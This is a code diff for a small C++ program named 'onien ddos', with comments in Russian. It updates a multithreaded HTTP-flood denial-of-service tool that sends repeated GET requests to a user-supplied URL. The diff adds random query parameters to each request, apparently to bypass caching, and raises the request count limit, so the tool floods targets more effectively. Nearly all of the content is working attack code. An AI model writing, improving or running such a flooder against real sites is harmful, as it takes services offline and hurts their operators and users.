@@ -6,6 +6,7 @@
 #include <string> //для работы со строками
 #include <stdio.h>
 #include <ppltasks.h>
+#include <ctime>
 
 using namespace std;
 using namespace cpr;
@@ -13,9 +14,30 @@ using namespace cpr;
 vector<thread> threads;
 
 
+string gen_random(const int len) {
+
+	string tmp_s;
+	static const char alphanum[] =
+		"0123456789"
+		"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+		"abcdefghijklmnopqrstuvwxyz";
+
+	srand((unsigned)time(NULL) * rand());
+
+	tmp_s.reserve(len);
+
+	for (int i = 0; i < len; ++i)
+		tmp_s += alphanum[rand() % (sizeof(alphanum) - 1)];
+
+
+	return tmp_s;
+}
+
+
 void request(string url) {
-	auto response = Get(Url{ url });
-	cout << "yes!" << endl;
+	cpr::Response r = cpr::Get(cpr::Url{ url },
+		cpr::Parameters{ {gen_random(5), gen_random(5)} });
+	cout << r.url << endl;
 }
 
 void ddosRequests(int retrys, string url) {
@@ -29,11 +51,11 @@ int main() {
 
 	setlocale(LC_ALL, "Russian");
 
-	int retryes; //повторы
+	long int retryes; //повторы
 
 	string urlDdos; //url ддоса
 
-	cout << "onien ddos v 0.01" << endl;
+	cout << "onien ddos v 0.2" << endl;
 
 	//запрашиваем кол-во повторений
 
@@ -51,4 +73,6 @@ int main() {
 	for (auto& thr : threads) {
 		thr.join();
 	}
+
+	cin.get();
 }
